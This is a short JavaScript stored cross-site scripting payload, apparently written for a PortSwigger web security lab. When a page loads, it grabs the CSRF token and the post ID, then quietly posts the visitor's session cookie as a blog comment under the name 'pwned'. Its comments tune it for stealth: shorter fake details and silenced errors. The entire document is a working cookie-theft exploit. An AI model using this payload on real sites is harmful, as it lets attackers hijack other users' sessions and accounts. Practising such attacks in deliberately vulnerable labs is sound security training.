<script>

document.addEventListener('DOMContentLoaded', () => {

  // More reliable CSRF token grab (PortSwigger labs usually use name="csrf")
  const csrfToken = document.querySelector('input[name="csrf"]')?.value;
  if (!csrfToken) return; // Fail silently if no token (prevents errors)

  // Dynamically grab postId from the current URL (works if ?postId=8 or similar)
  const urlParams = new URLSearchParams(window.location.search);
  const postId = urlParams.get('postId') || '8'; // Fallback to hardcoded if needed

  // Build minimal FormData – shorter fake details to reduce size/obviousness
  const data = new FormData();
  data.append('csrf', csrfToken);
  data.append('postId', postId);
  data.append('comment', document.cookie); // The actual theft
  data.append('name', 'pwned');
  data.append('email', 'a@b.c');
  data.append('website', '');

  // Send the request – removed 'no-cors' (unnecessary for same-origin and blocks response reading)
  fetch('/post/comment', {
    method: 'POST',
    body: data,
    credentials: 'include' // Ensures cookies are sent if needed (usually default)
  }).catch(() => {}); // Silent error handling – prevents console noise
});

</script>
